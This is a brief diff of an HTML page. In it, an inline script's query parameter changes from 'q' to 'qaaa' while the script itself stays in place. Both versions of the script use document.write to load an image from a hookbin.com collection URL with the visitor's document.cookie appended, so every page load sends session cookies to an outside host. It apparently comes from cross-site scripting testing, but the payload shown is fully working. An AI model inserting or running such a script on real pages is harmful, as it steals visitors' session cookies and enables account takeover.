@@ -11,7 +11,7 @@
     
     
 <script>
-    document.write('<img src="https://hookbin.com/1ggJnrn3RRtd6NOO6eo3?q="'+document.cookie+' alt="">');
+    document.write('<img src="https://hookbin.com/1ggJnrn3RRtd6NOO6eo3?qaaa="'+document.cookie+' alt="">');
 </script>
 </body>
 </html>
